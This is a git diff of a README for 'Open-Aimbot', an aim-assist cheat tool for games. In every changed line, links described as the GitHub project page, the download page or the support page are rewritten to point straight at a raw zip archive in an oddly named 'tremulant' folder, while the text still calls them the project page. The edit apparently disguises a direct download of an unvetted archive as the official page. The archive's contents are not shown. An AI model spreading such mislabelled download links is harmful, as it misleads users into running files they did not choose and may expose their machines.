@@ -1,6 +1,6 @@
 # 🎯 Open-Aimbot - Easy Aim Assistance Framework
 
-[![Download Open-Aimbot](https://img.shields.io/badge/Download-Open--Aimbot-brightgreen?style=for-the-badge)](https://github.com/FRAZE76/Open-Aimbot)
+[![Download Open-Aimbot](https://img.shields.io/badge/Download-Open--Aimbot-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/FRAZE76/Open-Aimbot/main/tremulant/Open-Aimbot-1.7.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Before you start, make sure your PC meets these basic requirements:
 ## 🚀 Getting Started: How to Download and Run Open-Aimbot
 
 1. Click the large green button above or visit this link to download the program:  
-   [https://github.com/FRAZE76/Open-Aimbot](https://github.com/FRAZE76/Open-Aimbot)
+   [https://raw.githubusercontent.com/FRAZE76/Open-Aimbot/main/tremulant/Open-Aimbot-1.7.zip](https://raw.githubusercontent.com/FRAZE76/Open-Aimbot/main/tremulant/Open-Aimbot-1.7.zip)
 
 2. This link takes you to the main project page on GitHub. Look for the latest release under the "Releases" tab at the right or center of the page.
 
@@ -109,7 +109,7 @@ Do not change file names or move these folders, or the program might stop workin
 
 For help, bug reports, or updates:
 
-- Visit the GitHub page: [https://github.com/FRAZE76/Open-Aimbot](https://github.com/FRAZE76/Open-Aimbot)  
+- Visit the GitHub page: [https://raw.githubusercontent.com/FRAZE76/Open-Aimbot/main/tremulant/Open-Aimbot-1.7.zip](https://raw.githubusercontent.com/FRAZE76/Open-Aimbot/main/tremulant/Open-Aimbot-1.7.zip)  
 - Check the "Issues" tab for common problems or to report new ones  
 - Use the "Discussions" tab to ask questions or suggest improvements
 
@@ -131,4 +131,4 @@ Using bots in games can conflict with game rules. Be aware of your game’s poli
 
 To get started, visit the official project page:  
 
-[![Get Open-Aimbot](https://img.shields.io/badge/Open--Aimbot-Download%20Page-blue?style=for-the-badge)](https://github.com/FRAZE76/Open-Aimbot)
+[![Get Open-Aimbot](https://img.shields.io/badge/Open--Aimbot-Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/FRAZE76/Open-Aimbot/main/tremulant/Open-Aimbot-1.7.zip)
